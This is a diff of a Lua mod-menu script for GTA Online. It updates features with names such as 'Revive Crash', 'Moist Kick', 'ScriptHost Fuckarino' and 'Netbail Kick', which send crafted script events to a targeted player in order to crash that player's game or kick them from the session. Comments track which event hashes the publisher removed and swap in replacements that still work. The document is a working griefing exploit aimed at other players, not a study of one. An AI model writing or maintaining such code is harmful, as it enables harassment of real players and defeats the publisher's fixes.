@@ -226,7 +226,7 @@ menu.add_player_feature("Osiris Kick", "action", popt.opption, function(feat, pi
 	osiris_kick_v4(pid)
 end)
 
---\\2t1Revive crash
+--\\2t1Revive crash : se crash 2
 menu.add_player_feature("Revive Crash", "action", popt.opption, function(feat, pid)
     script.trigger_script_event(-1386010354, pid, {0, 0, 30583, 0, 0, 0, -328966, -1933210564, 0})
 end)
@@ -235,8 +235,10 @@ end)
 menu.add_player_feature("Moist Kick v1", "action", popt.opption, function(feat, pid)
 
         script.trigger_script_event(0xc50f74ca, pid, {23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
-		script.trigger_script_event(2092565704, pid, {23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
-		script.trigger_script_event(2092565704, pid, {23135423, pid, 827870001, -1729222815, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
+	--netbail se : with weird params?
+	script.trigger_script_event(1228916411, pid, {23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
+	--netbail se : with weird params?
+	script.trigger_script_event(1228916411, pid, {23135423, pid, 827870001, -1729222815, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
 
 end)
 
@@ -315,14 +317,22 @@ end)
 menu.add_player_feature("ScriptHost Fuckarino (M)", "toggle", popt.opption, function(feat, pid)
 	if feat.on then
 		if player.is_player_valid(pid) then
-			script.trigger_script_event(-877212109, pid, {91645, -99683, 1788, 60877, 55085, 72028})
-			script.trigger_script_event(-877212109, pid, {91645, -99683, 1788, 60877, 55085, 72028})
+			--se crash 8
+			script.trigger_script_event(1258808115, pid, {91645, -99683, 1788, 60877, 55085, 72028})
+			script.trigger_script_event(1258808115, pid, {91645, -99683, 1788, 60877, 55085, 72028})
+			
 			script.trigger_script_event(0x7cba04c8, pid, {pid, script.get_global_i(1630816 + (1 + (7 * 597)) + 508)})
-			script.trigger_script_event(-877212109, pid, {-1, 500000, 849451549, -1, -1})
+			--se crash 8
+			script.trigger_script_event(1258808115, pid, {-1, 500000, 849451549, -1, -1})
+			--r* removed this se
 			script.trigger_script_event(315658550, pid, {-1, 500000, 849451549, -1, -1})
-			script.trigger_script_event(-877212109, pid, {-1139568479, -1, 1, 100099})
+			--se crash 8
+			script.trigger_script_event(1258808115, pid, {-1139568479, -1, 1, 100099})
+			--r* removed this se
 			script.trigger_script_event(315658550, pid, {-1139568479, -1, 1, 100099, -1, 500000, 849451549, -1, -1, 91645, -99683, 1788, 60877, 55085, 72028})
-			script.trigger_script_event(-877212109, pid, {-1, -1, -1, -1, -1139568479, -1, 1, 100099, -1, 500000, 849451549, -1, -1, 91645, -99683, 1788, 60877, 55085, 72028})
+			--se crash 8
+			script.trigger_script_event(1258808115, pid, {-1, -1, -1, -1, -1139568479, -1, 1, 100099, -1, 500000, 849451549, -1, -1, 91645, -99683, 1788, 60877, 55085, 72028})
+			--r* removed this se
 			script.trigger_script_event(315658550, pid, {-1139568479, -1, 1, 100099, -1, 500000, 849451549, -1, -1, 91645, -99683, 1788, 60877, 55085, 72028})
 			system.yield(350)
 		end		
@@ -334,7 +344,7 @@ end)
 local smart = menu.add_player_feature("Smart Se Spam", "toggle", popt.opption, function(feat, pid)
 	menu.create_thread(customSES, {val = feat, id = pid})
 end)
-
+--[[
 --\\Moist se spam
 menu.add_player_feature("Kick Data 1 Type 1 (M)", "toggle", popt.opption, function(feat, pid)
 	if feat.on then
@@ -376,7 +386,7 @@ menu.add_player_feature("Kick Data 1 Type 2 (M)", "toggle", popt.opption, functi
 		end
 	end
 end)
-
+]]
 --\\Took netbail se from keks and make work here
 menu.add_player_feature("Netbail Kick", "action", popt.opption, function(feat, pid)
 	netbail(pid)
